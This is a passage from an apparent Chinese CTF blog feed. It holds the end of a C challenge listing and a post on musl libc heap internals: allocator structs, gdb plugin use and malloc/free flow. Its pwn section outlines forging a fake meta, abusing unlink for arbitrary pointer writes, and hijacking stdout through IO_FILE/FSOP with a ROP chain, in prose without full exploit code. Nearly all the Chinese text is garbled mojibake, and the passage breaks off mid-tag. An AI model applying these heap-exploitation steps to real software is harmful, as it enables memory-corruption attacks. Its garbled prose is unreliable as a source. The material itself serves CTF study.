class="number">83</span>);</span><br><span class="line">    Qanux084(<span class="number">84</span>);</span><br><span class="line">    Qanux085(<span class="number">85</span>);</span><br><span class="line">    Qanux086(<span class="number">86</span>);</span><br><span class="line">    Qanux087(<span class="number">87</span>);</span><br><span class="line">    Qanux088(<span class="number">88</span>);</span><br><span class="line">    Qanux089(<span class="number">89</span>);</span><br><span class="line">    Qanux090(<span class="number">90</span>);</span><br><span class="line">    Qanux091(<span class="number">91</span>);</span><br><span class="line">    Qanux092(<span class="number">92</span>);</span><br><span class="line">    Qanux093(<span class="number">93</span>);</span><br><span class="line">    Qanux094(<span class="number">94</span>);</span><br><span class="line">    Qanux095(<span class="number">95</span>);</span><br><span class="line">    Qanux096(<span class="number">96</span>);</span><br><span class="line">    Qanux097(<span class="number">97</span>);</span><br><span class="line">    Qanux098(<span class="number">98</span>);</span><br><span class="line">    Qanux099(<span class="number">99</span>);</span><br><span class="line">    Qanux100(<span class="number">100</span>);</span><br><span class="line">    Qanux101(<span class="number">101</span>);</span><br><span class="line">    Qanux102(<span class="number">102</span>);</span><br><span class="line">    Qanux103(<span class="number">103</span>);</span><br><span class="line">    Qanux104(<span class="number">104</span>);</span><br><span class="line">    Qanux105(<span class="number">105</span>);</span><br><span class="line">    Qanux106(<span class="number">106</span>);</span><br><span class="line">    Qanux107(<span class="number">107</span>);</span><br><span class="line">    Qanux108(<span class="number">108</span>);</span><br><span class="line">    Qanux109(<span class="number">109</span>);</span><br><span class="line">    Qanux110(<span class="number">110</span>);</span><br><span class="line">    Qanux111(<span class="number">111</span>);</span><br><span class="line">    Qanux112(<span class="number">112</span>);</span><br><span class="line">    Qanux113(<span class="number">113</span>);</span><br><span class="line">    Qanux114(<span class="number">114</span>);</span><br><span class="line">    Qanux115(<span class="number">115</span>);</span><br><span class="line">    Qanux116(<span class="number">116</span>);</span><br><span class="line">    Qanux117(<span class="number">117</span>);</span><br><span class="line">    Qanux118(<span class="number">118</span>);</span><br><span class="line">    Qanux119(<span class="number">119</span>);</span><br><span class="line">    Qanux120(<span class="number">120</span>);</span><br><span class="line">    Qanux121(<span class="number">121</span>);</span><br><span class="line">    Qanux122(<span class="number">122</span>);</span><br><span class="line">    Qanux123(<span class="number">123</span>);</span><br><span class="line">    Qanux124(<span class="number">124</span>);</span><br><span class="line">    Qanux125(<span class="number">125</span>);</span><br><span class="line">    Qanux126(<span class="number">126</span>);</span><br><span class="line">    Qanux127(<span class="number">127</span>);</span><br><span class="line">    Qanux128(<span class="number">128</span>);</span><br><span class="line">    Qanux129(<span class="number">129</span>);</span><br><span class="line">    Qanux130(<span class="number">130</span>);</span><br><span class="line">    Qanux131(<span class="number">131</span>);</span><br><span class="line">    Qanux132(<span class="number">132</span>);</span><br><span class="line">    Qanux133(<span class="number">133</span>);</span><br><span class="line">    Qanux134(<span class="number">134</span>);</span><br><span class="line">    Qanux135(<span class="number">135</span>);</span><br><span class="line">    Qanux136(<span class="number">136</span>);</span><br><span class="line">    Qanux137(<span class="number">137</span>);</span><br><span class="line">    Qanux138(<span class="number">138</span>);</span><br><span class="line">    Qanux139(<span class="number">139</span>);</span><br><span class="line">    Qanux140(<span class="number">140</span>);</span><br><span class="line">    Qanux141(<span class="number">141</span>);</span><br><span class="line">    Qanux142(<span class="number">142</span>);</span><br><span class="line">    Qanux143(<span class="number">143</span>);</span><br><span class="line">    Qanux144(<span class="number">144</span>);</span><br><span class="line">    Qanux145(<span class="number">145</span>);</span><br><span class="line">    Qanux146(<span class="number">146</span>);</span><br><span class="line">    Qanux147(<span class="number">147</span>);</span><br><span class="line">    Qanux148(<span class="number">148</span>);</span><br><span class="line">    Qanux149(<span class="number">149</span>);</span><br><span class="line">    Qanux150(<span class="number">150</span>);</span><br><span class="line">    Qanux151(<span class="number">151</span>);</span><br><span class="line">    Qanux152(<span class="number">152</span>);</span><br><span class="line">    Qanux153(<span class="number">153</span>);</span><br><span class="line">    Qanux154(<span class="number">154</span>);</span><br><span class="line">    Qanux155(<span class="number">155</span>);</span><br><span class="line">    Qanux156(<span class="number">156</span>);</span><br><span class="line">    Qanux157(<span class="number">157</span>);</span><br><span class="line">    Qanux158(<span class="number">158</span>);</span><br><span class="line">    Qanux159(<span class="number">159</span>);</span><br><span class="line">    Qanux160(<span class="number">160</span>);</span><br><span class="line">    Qanux161(<span class="number">161</span>);</span><br><span class="line">    Qanux162(<span class="number">162</span>);</span><br><span class="line">    Qanux163(<span class="number">163</span>);</span><br><span class="line">    Qanux164(<span class="number">164</span>);</span><br><span class="line">    Qanux165(<span class="number">165</span>);</span><br><span class="line">    Qanux166(<span class="number">166</span>);</span><br><span class="line">    Qanux167(<span class="number">167</span>);</span><br><span class="line">    Qanux168(<span class="number">168</span>);</span><br><span class="line">    Qanux169(<span class="number">169</span>);</span><br><span class="line">    Qanux170(<span class="number">170</span>);</span><br><span class="line">    Qanux171(<span class="number">171</span>);</span><br><span class="line">    Qanux172(<span class="number">172</span>);</span><br><span class="line">    Qanux173(<span class="number">173</span>);</span><br><span class="line">    Qanux174(<span class="number">174</span>);</span><br><span class="line">    Qanux175(<span class="number">175</span>);</span><br><span class="line">    Qanux176(<span class="number">176</span>);</span><br><span class="line">    Qanux177(<span class="number">177</span>);</span><br><span class="line">    Qanux178(<span class="number">178</span>);</span><br><span class="line">    Qanux179(<span class="number">179</span>);</span><br><span class="line">    Qanux180(<span class="number">180</span>);</span><br><span class="line">    Qanux181(<span class="number">181</span>);</span><br><span class="line">    Qanux182(<span class="number">182</span>);</span><br><span class="line">    Qanux183(<span class="number">183</span>);</span><br><span class="line">    Qanux184(<span class="number">184</span>);</span><br><span class="line">    Qanux185(<span class="number">185</span>);</span><br><span class="line">    Qanux186(<span class="number">186</span>);</span><br><span class="line">    Qanux187(<span class="number">187</span>);</span><br><span class="line">    Qanux188(<span class="number">188</span>);</span><br><span class="line">    Qanux189(<span class="number">189</span>);</span><br><span class="line">    Qanux190(<span class="number">190</span>);</span><br><span class="line">    Qanux191(<span class="number">191</span>);</span><br><span class="line">    Qanux192(<span class="number">192</span>);</span><br><span class="line">    Qanux193(<span class="number">193</span>);</span><br><span class="line">    Qanux194(<span class="number">194</span>);</span><br><span class="line">    Qanux195(<span class="number">195</span>);</span><br><span class="line">    Qanux196(<span class="number">196</span>);</span><br><span class="line">    Qanux197(<span class="number">197</span>);</span><br><span class="line">    Qanux198(<span class="number">198</span>);</span><br><span class="line">    Qanux199(<span class="number">199</span>);</span><br><span class="line">    Qanux200(<span class="number">200</span>);</span><br><span class="line">    Qanux201(<span class="number">201</span>);</span><br><span class="line">    Qanux202(<span class="number">202</span>);</span><br><span class="line">    Qanux203(<span class="number">203</span>);</span><br><span class="line">    Qanux204(<span class="number">204</span>);</span><br><span class="line">    Qanux205(<span class="number">205</span>);</span><br><span class="line">    Qanux206(<span class="number">206</span>);</span><br><span class="line">    Qanux207(<span class="number">207</span>);</span><br><span class="line">    Qanux208(<span class="number">208</span>);</span><br><span class="line">    Qanux209(<span class="number">209</span>);</span><br><span class="line">    Qanux210(<span class="number">210</span>);</span><br><span class="line">    Qanux211(<span class="number">211</span>);</span><br><span class="line">    Qanux212(<span class="number">212</span>);</span><br><span class="line">    Qanux213(<span class="number">213</span>);</span><br><span class="line">    Qanux214(<span class="number">214</span>);</span><br><span class="line">    Qanux215(<span class="number">215</span>);</span><br><span class="line">    Qanux216(<span class="number">216</span>);</span><br><span class="line">    Qanux217(<span class="number">217</span>);</span><br><span class="line">    Qanux218(<span class="number">218</span>);</span><br><span class="line">    Qanux219(<span class="number">219</span>);</span><br><span class="line">    Qanux220(<span class="number">220</span>);</span><br><span class="line">    Qanux221(<span class="number">221</span>);</span><br><span class="line">    Qanux222(<span class="number">222</span>);</span><br><span class="line">    Qanux223(<span class="number">223</span>);</span><br><span class="line">    Qanux224(<span class="number">224</span>);</span><br><span class="line">    Qanux225(<span class="number">225</span>);</span><br><span class="line">    Qanux226(<span class="number">226</span>);</span><br><span class="line">    Qanux227(<span class="number">227</span>);</span><br><span class="line">    Qanux228(<span class="number">228</span>);</span><br><span class="line">    Qanux229(<span class="number">229</span>);</span><br><span class="line">    Qanux230(<span class="number">230</span>);</span><br><span class="line">    Qanux231(<span class="number">231</span>);</span><br><span class="line">    Qanux232(<span class="number">232</span>);</span><br><span class="line">    Qanux233(<span class="number">233</span>);</span><br><span class="line">    Qanux234(<span class="number">234</span>);</span><br><span class="line">    Qanux235(<span class="number">235</span>);</span><br><span class="line">    Qanux236(<span class="number">236</span>);</span><br><span class="line">    Qanux237(<span class="number">237</span>);</span><br><span class="line">    Qanux238(<span class="number">238</span>);</span><br><span class="line">    Qanux239(<span class="number">239</span>);</span><br><span class="line">    Qanux240(<span class="number">0</span>);</span><br><span class="line">    Qanux241(<span class="number">0xe0</span>);</span><br><span class="line">    Qanux242(<span class="number">0x77</span>);</span><br><span class="line">    Qanux243(<span class="number">0</span>);</span><br><span class="line">    Qanux244(<span class="number">0</span>);</span><br><span class="line">    Qanux245(<span class="number">0</span>);</span><br><span class="line">    Qanux246(<span class="number">0</span>);</span><br><span class="line">    Qanux247(<span class="number">0</span>);</span><br><span class="line">    Qanux248(<span class="number">248</span>);</span><br><span class="line">    Qanux249(<span class="number">249</span>);</span><br><span class="line">    Qanux250(<span class="number">250</span>);</span><br><span class="line">    Qanux251(<span class="number">251</span>);</span><br><span class="line">    Qanux252(<span class="number">252</span>);</span><br><span class="line">    Qanux253(<span class="number">253</span>);</span><br><span class="line">    Qanux254(<span class="number">254</span>);</span><br><span class="line">    Qanux255(<span class="number">255</span>);</span><br><span class="line">    Qanux240(<span class="number">666</span>);</span><br><span class="line">    Qanux241(<span class="number">666</span>);</span><br><span class="line">    Qanux242(<span class="number">666</span>);</span><br><span class="line">    Qanux243(<span class="number">666</span>);</span><br><span class="line">    Qanux244(<span class="number">666</span>);</span><br><span class="line">    Qanux245(<span class="number">666</span>);</span><br><span class="line">    Qanux246(<span class="number">666</span>);</span><br><span class="line">    Qanux247(<span class="number">666</span>);</span><br><span class="line">    fight(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å‚è€ƒï¼š<br><a href="https://zhuanlan.zhihu.com/p/122522485?utm_id=0">https://zhuanlan.zhihu.com/p/122522485?utm_id=0</a><br><a href="https://bbs.kanxue.com/thread-273119.htm#msg_header_h1_0">https://bbs.kanxue.com/thread-273119.htm#msg_header_h1_0</a><br><a href="https://bbs.kanxue.com/thread-274259.htm#msg_header_h2_6">https://bbs.kanxue.com/thread-274259.htm#msg_header_h2_6</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>åˆæ¢musl</title>
      <link href="/2024/01/17/musl/"/>
      <url>/2024/01/17/musl/</url>
      
        <content type="html"><![CDATA[<p>å…¶å®å°±æ˜¯å¯¹å„ä½å¤§ä½¬åšå®¢çš„å„ç§æ‘˜æŠ„å’Œæ€»ç»“Â·Â·Â·ï¼Œæ–¹ä¾¿è‡ªå·±ä»¥ååšé¢˜</p><h2 id="ç»“æ„ä½“"><a href="#ç»“æ„ä½“" class="headerlink" title="ç»“æ„ä½“"></a>ç»“æ„ä½“</h2><p>chunk:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">chunk</span>&#123;</span></span><br><span class="line"> <span class="type">char</span> prev_user_data[];</span><br><span class="line">    <span class="type">uint8_t</span> idx;  <span class="comment">//ä½5bitä¸ºidxç¬¬å‡ ä¸ªchunk</span></span><br><span class="line">    <span class="type">uint16_t</span> offset; <span class="comment">//ä¸ç¬¬ä¸€ä¸ªchunkèµ·å§‹åœ°å€çš„åç§»ï¼Œå®é™…åœ°å€åç§»ä¸ºoffset * UNIT,è¯¦ç»†è¯·çœ‹get_metaæºç ä¸­å¾—åˆ°groupåœ°å€çš„è€Œè¿‡ç¨‹ï¼</span></span><br><span class="line">    <span class="type">char</span> data[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åœ¨é‡Šæ”¾å <code>chunk</code> å¤´çš„ <code>idx</code>ä¼šå˜æˆ<code>0xff</code> <code>offset</code> ä¼šæ¸…é›¶</p><h3 id="group"><a href="#group" class="headerlink" title="group:"></a>group:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> UNIT 16</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IB 4</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">group</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">meta</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> active_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">char</span> pad[UNIT - <span class="keyword">sizeof</span>(<span class="keyword">struct</span> meta *) - <span class="number">1</span>];<span class="comment">//padding=0x10B</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> storage[];<span class="comment">// chunks</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>åœ¨<code>musl</code>ä¸­åŒä¸€ç±»å¤§å°çš„<code>chunk</code>éƒ½æ˜¯è¢«åˆ†é…åˆ°åŒä¸€ä¸ª<code>group</code>ä¸­è¿›è¡Œç®¡ç†</p><h3 id="meta"><a href="#meta" class="headerlink" title="meta:"></a>meta:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">prev</span>, *<span class="title">next</span>;</span><span class="comment">//åŒå‘é“¾è¡¨</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">group</span> *<span class="title">mem</span>;</span><span class="comment">// è¿™é‡ŒæŒ‡å‘ç®¡ç†çš„group åœ°å€</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">int</span> avail_mask, freed_mask;<span class="comment">// bitmap çš„å½¢å¼ä½“ç° chunk çš„çŠ¶æ€</span></span><br><span class="line">    <span class="type">uintptr_t</span> last_idx:<span class="number">5</span>;</span><br><span class="line">    <span class="type">uintptr_t</span> freeable:<span class="number">1</span>;<span class="comment">// ä»£è¡¨metaå¦å¯ä»¥è¢«å›æ”¶ freeable=0 ä»£è¡¨ä¸å¯ä»¥ =1 ä»£è¡¨å¯ä»¥</span></span><br><span class="line">    <span class="type">uintptr_t</span> sizeclass:<span class="number">6</span>;<span class="comment">// sizeclass=6 è¡¨ç¤ºç”±0x6è¿™ä¸ªgroupè¿›è¡Œç®¡ç†è¿™ä¸€ç±»çš„å¤§å°çš„chunk</span></span><br><span class="line">    <span class="type">uintptr_t</span> maplen:<span class="number">8</span>*<span class="keyword">sizeof</span>(<span class="type">uintptr_t</span>)<span class="number">-12</span>;<span class="comment">// meta-&gt;maplen = (needed+4095)/4096</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>maplen &gt;&#x3D; 1è¡¨ç¤ºè¿™ä¸ª<code>meta</code>é‡Œçš„<code>group</code>æ˜¯æ–°<code>mmap</code>å‡ºæ¥çš„,é•¿åº¦ä¸ºå¤šå°‘,å¹¶ä¸”è¿™ä¸ª<code>group</code> ä¸åœ¨<code>size_classes</code>é‡Œ<br>maplen &#x3D;0 è¡¨ç¤º<code>group</code>ä¸æ˜¯æ–°<code>mmap</code>å‡ºæ¥çš„åœ¨<code>size_classes</code>é‡Œ<br>ç»†èŠ‚ï¼š</p><ul><li><code>meta</code>ä¸€èˆ¬ç”³è¯·çš„æ˜¯å †ç©ºé—´<code>brk</code>åˆ†é…çš„ï¼Œæœ‰å¯èƒ½æ˜¯<code>mmap</code>æ˜ å°„çš„ï¼Œè€Œ<code>group</code>éƒ½æ˜¯ä½¿ç”¨çš„<code>mmap</code>çš„ç©ºé—´</li><li>ç”±äº<code>bitmap</code>çš„é™åˆ¶,å› æ­¤ä¸€ä¸ª<code>group</code>ä¸­æœ€å¤šåªèƒ½æœ‰<code>32</code>ä¸ª<code>chunk</code></li></ul><h3 id="meta-area"><a href="#meta-area" class="headerlink" title="meta_area:"></a>meta_area:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> check;<span class="comment">// æ˜¯ä¸ªæ ¡éªŒæ•°å­— ä¿æŠ¤meta_area é‡Œçš„metaï¼Œé˜²æ­¢metaè¢« ä¼ªé€ </span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">next</span>;</span><span class="comment">// æŒ‡å‘ä¸‹ä¸€ä¸ªmeta_area å¦‚æœæ²¡æœ‰ å°±é»˜è®¤ä¸º0</span></span><br><span class="line">    <span class="type">int</span> nslots;<span class="comment">// meta æ§½çš„æ•°é‡</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> <span class="title">slots</span>[];</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>meta_area æ˜¯ç®¡ç†<code>meta</code>çš„åˆé›† <code>meta_area</code> ä»¥é¡µä¸ºå•ä½åˆ†é…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> <span class="title">area</span> =</span> (<span class="type">void</span> )((<span class="type">uintptr_t</span>)meta &amp; <span class="number">-4096</span>)</span><br></pre></td></tr></table></figure><p>ç»†èŠ‚ï¼š</p><ul><li>åœ¨è¿™ä¸ª<code>meta_area</code>é¡µè¢«ä½¿ç”¨çš„æ—¶å€™ï¼Œä¸Šä¸€ä¸ªä¸´è¿‘çš„é¡µä¼šè¢«è®¾ç½®ä¸ºä¸å¯å†™æ˜¯ä¸ºäº†é˜²æ­¢ ä½¿ç”¨è€…è¦†ç›–<code>check</code>æ ¡éªŒå€¼</li></ul><h3 id="malloc-context"><a href="#malloc-context" class="headerlink" title="__malloc_context:"></a>__malloc_context:</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_context</span> &#123;</span></span><br><span class="line">    <span class="type">uint64_t</span> secret;<span class="comment">// å’Œmeta_area å¤´çš„check æ˜¯åŒä¸€ä¸ªå€¼ å°±æ˜¯æ ¡éªŒå€¼</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifndef</span> PAGESIZE</span></span><br><span class="line">    <span class="type">size_t</span> pagesize;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="type">int</span> init_done;<span class="comment">//æ˜¯å¦åˆå§‹åŒ–æ ‡è®°</span></span><br><span class="line">    <span class="type">unsigned</span> mmap_counter;<span class="comment">// è®°å½•æœ‰å¤šå°‘mmap çš„å†…å­˜çš„æ•°é‡</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">free_meta_head</span>;</span><span class="comment">// è¢«free çš„meta å¤´ è¿™é‡Œmeta ç®¡ç†ä½¿ç”¨äº†é˜Ÿåˆ—å’ŒåŒå‘å¾ªç¯é“¾è¡¨</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">avail_meta</span>;</span><span class="comment">//æŒ‡å‘å¯ç”¨metaæ•°ç»„</span></span><br><span class="line">    <span class="type">size_t</span> avail_meta_count, avail_meta_area_count, meta_alloc_shift;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta_area</span> *<span class="title">meta_area_head</span>, *<span class="title">meta_area_tail</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *avail_meta_areas;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">meta</span> *<span class="title">active</span>[48];</span><span class="comment">// è®°å½•ç€å¯ç”¨çš„meta</span></span><br><span class="line">    <span class="type">size_t</span> u sage_by_class[<span class="number">48</span>];</span><br><span class="line">    <span class="type">uint8_t</span> unmap_seq[<span class="number">32</span>], bounces[<span class="number">32</span>];</span><br><span class="line">    <span class="type">uint8_t</span> seq;</span><br><span class="line">    <span class="type">uintptr_t</span> brk;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>æ˜¯<code>musl libc</code>è®°å½•ç»“æ„çŠ¶æ€çš„è¡¨ï¼Œè®°å½•å„ä¸ª<code>meta</code> å’Œ <code>secret</code> é˜Ÿåˆ—ä¿¡æ¯ç­‰</p><h3 id="å°æ€»ç»“"><a href="#å°æ€»ç»“" class="headerlink" title="å°æ€»ç»“"></a>å°æ€»ç»“</h3><ul><li><code>musl</code> ä¸­å †çš„ç®¡ç†ç”±<code>meta</code> ç®¡ç† <code>group</code> ï¼Œ<code>group</code> ç®¡ç† <code>chunk</code></li><li>åœ¨<code>free</code> æˆ–è€… <code>malloc chunk</code> çš„æ—¶å€™åˆæ˜¯ä» <code>chunk</code> åˆ°<code>group</code> å†åˆ°<code>meta</code> ä»å°åˆ°å¤§ç´¢å¼•</li><li><code>meta</code> é—´é€šè¿‡<code>meta</code> ä¸­<code>prev next</code> ç»“æ„å½¢æˆå¾ªç¯é“¾è¡¨è¿æ¥</li></ul><h2 id="gdbè°ƒè¯•æŠ€å·§"><a href="#gdbè°ƒè¯•æŠ€å·§" class="headerlink" title="gdbè°ƒè¯•æŠ€å·§"></a>gdbè°ƒè¯•æŠ€å·§</h2><p>ä¸‹è½½<code>xf1le</code>å¸ˆå‚…çš„<code>gdb</code>æ’ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/xf1les/muslheap.git  </span><br><span class="line">echo &quot;source /path/to/muslheap.py&quot; &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure><h3 id="mheap"><a href="#mheap" class="headerlink" title="mheap"></a>mheap</h3><p>å¯ä»¥æŸ¥çœ‹<code>__malloc_context</code>çš„éƒ¨åˆ†ä¿¡æ¯ï¼Œå¯ä»¥è¯¦ç»†çœ‹åˆ°æ¯ä¸€æ¡<code>meta</code>é“¾è¡¨</p><img src="/2024/01/17/musl/1.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h3 id="p-malloc-context"><a href="#p-malloc-context" class="headerlink" title="p __malloc_context"></a>p __malloc_context</h3><p>å¯ä»¥æŸ¥çœ‹<code>__malloc_context</code>çš„è¯¦ç»†ä¿¡æ¯ï¼Œä½†æ— æ³•è¯¦ç»†çœ‹åˆ°æ¯ä¸€æ¡<code>meta</code>é“¾è¡¨</p><img src="/2024/01/17/musl/2.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h3 id="mmagic"><a href="#mmagic" class="headerlink" title="mmagic"></a>mmagic</h3><p>ç”¨äºæŸ¥çœ‹å…³é”®å‡½æ•°çš„åœ°å€</p><img src="/2024/01/17/musl/3.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h3 id="p-struct-meta"><a href="#p-struct-meta" class="headerlink" title="p (struct meta)&lt;metaåœ°å€&gt;"></a>p <em>(struct meta</em>)&lt;metaåœ°å€&gt;</h3><p>æŸ¥çœ‹æŸä¸ª<code>meta</code>ç»“æ„ä½“çš„è¯¦ç»†ä¿¡æ¯</p><img src="/2024/01/17/musl/4.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h2 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h2><p>è¿™é‡Œç›´æ¥è´´ä¸Š<code>0xRGz</code>å¸ˆå‚…çš„æ–‡ç« </p><img src="/2024/01/17/musl/5.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  <h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><p>è¿™é‡Œä¸€æ ·ç›´æ¥è´´ä¸Š<code>0xRGz</code>å¸ˆå‚…çš„æ–‡ç« <code>Orz</code><br>freeæµç¨‹ï¼š</p><ul><li>é€šè¿‡<code>get_meta(p)</code>å¾—åˆ°<code>meta</code> (<code>get_meta</code> æ˜¯é€šè¿‡<code>chunk</code> å¯¹åº”çš„<code>offset</code> ç´¢å¼•åˆ°å¯¹åº”çš„<code>group</code> å†ç´¢å¼•åˆ°<code>meta</code>) ä¸‹é¢ä¼šè¯¦ç»†ä»‹ç»<code>get_meta</code></li><li>é€šè¿‡<code>get_slot_index(p)</code>å¾—åˆ°å¯¹åº”<code>chunk</code>çš„ <code>idx</code> -&gt; é€šè¿‡<code>get_nominal_size(p, end)</code> ç®—å‡ºçœŸå®å¤§å°</li><li>é‡ç½®<code>idx</code> å’Œ <code>offset idx</code> è¢«ç½®ä¸º<code>0xff</code> æ ‡è®°<code>chunk</code></li><li>ä¿®æ”¹<code>freed_mask</code> æ ‡è®°<code>chunk</code>è¢«é‡Šæ”¾</li><li>æœ€åè°ƒç”¨<code>nontrivial_free</code> å®Œæˆå…³äº<code>meta</code>ä¸€äº›å‰©ä½™æ“ä½œ</li></ul><h2 id="pwné¢˜å¸¸ç”¨æŠ€å·§"><a href="#pwné¢˜å¸¸ç”¨æŠ€å·§" class="headerlink" title="pwné¢˜å¸¸ç”¨æŠ€å·§"></a>pwné¢˜å¸¸ç”¨æŠ€å·§</h2><p>ä¸€èˆ¬æœ‰å¦‚ä¸‹å‡ ç§åˆ©ç”¨æ–¹æ³•ï¼Œæ ¸å¿ƒåŸç†éƒ½æ˜¯æ„é€ å‡çš„<code>chunk</code> ç´¢å¼•åˆ°å‡çš„<code>group</code> ä»è€Œæ‰€å¼•å¯¼å‡çš„<code>meta</code>æˆ–è¦†ç›–<code>group</code> ä¸­æŒ‡å‘<code>meta</code> çš„æŒ‡é’ˆ è¦†ç›–ä¸ºå‡çš„<code>meta</code> ï¼Œç„¶åä½¿å¾—å‡çš„<code>meta dequeue</code> æœ€ç»ˆå®ç°<code>unlink</code><br>(æ„é€ <code>fake_meta</code> éœ€è¦å…ˆæ³„éœ² <code>secret</code> æ ¡éªŒå€¼)<br>1ã€ä¼ªé€ <code>meta</code> åæ»¡è¶³å„ç§æ¡ä»¶ ä½¿å¾—å…¶è¿›å…¥<code>dequeue</code> é€šè¿‡<code>unlink</code>,æ„é€ <code>prev</code>,<code>next</code> å®ç°ä»»æ„åœ°å€æŒ‡é’ˆäº’å†™<br>é€šè¿‡ä»»æ„åœ°å€äº’å†™æŒ‡é’ˆï¼Œå‘<code>stdout_used</code> å†™å…¥æˆ‘ä»¬ä¼ªé€ çš„<code>fake_stdout</code>åœ°å€ï¼Œ é€šè¿‡<code>IO_FILE</code> åŠ«æŒç¨‹åºæ‰§è¡Œæµ<br>åˆ°æˆ‘ä»¬å¸ƒç½®å¥½çš„<code>fake_stdout</code> ä¸Šï¼Œå¯ä»¥æ‰¾<code>IO_FILE</code> é‡Œçš„ä¸€äº›å‡½æ•°<code>exit puts</code>åœ¨<code>fake_stdout</code>ä¸Šå¸ƒç½®<code>rop_chain</code>ç„¶åé€šè¿‡æ ˆè¿ç§»çš„<code>gadget</code> åˆ©ç”¨<code>FSOP</code> åŠ«æŒç¨‹åºåˆ°å¸ƒç½®çš„<code>fake_stdout</code>ä¸Š<br>2ã€ä¼ªé€ <code>fake_meta</code> ä¹Ÿæ˜¯ä»»æ„åœ°å€æŒ‡é’ˆäº’å†™ï¼Œå…ˆè¿›è¡Œå¸ƒå±€ä½¿å¾— <code>fake_meta dequeue</code> å®ç°<code>unlink</code>ï¼Œå†åˆ©ç”¨æŒ‡é’ˆäº’å†™ ä¿®æ”¹<code>fake_meta</code> ä¸­çš„<code>mem</code>(<code>mem</code> å°±æ˜¯<code>group</code> åŒºåŸŸ) ï¼ŒæŠŠ<code>mem</code> ä¿®æ”¹ä¸ºæˆ‘ä»¬æƒ³è¦çš„åœ°å€ï¼Œç„¶åè®©<code>fake_meta</code> é€šè¿‡<code>queue</code> å…¥é˜Ÿï¼Œå¯ä»¥å®ç°ä»»æ„åœ°å€åˆ†é…çš„ï¼Œç„¶ååŒæ ·æ˜¯æ‰“ <code>IO_FILE</code> é€šè¿‡ä¿®æ”¹<code>stdout stdin</code> å’Œ<code>stderr</code> ç»“æ„ä½“ åŠ«æŒç¨‹åºæµ</p><h2 id="è¡¥å……ï¼šéƒ¨åˆ†é‡è¦å‡½æ•°æºç "><a href="#è¡¥å……ï¼šéƒ¨åˆ†é‡è¦å‡½æ•°æºç " class="headerlink" 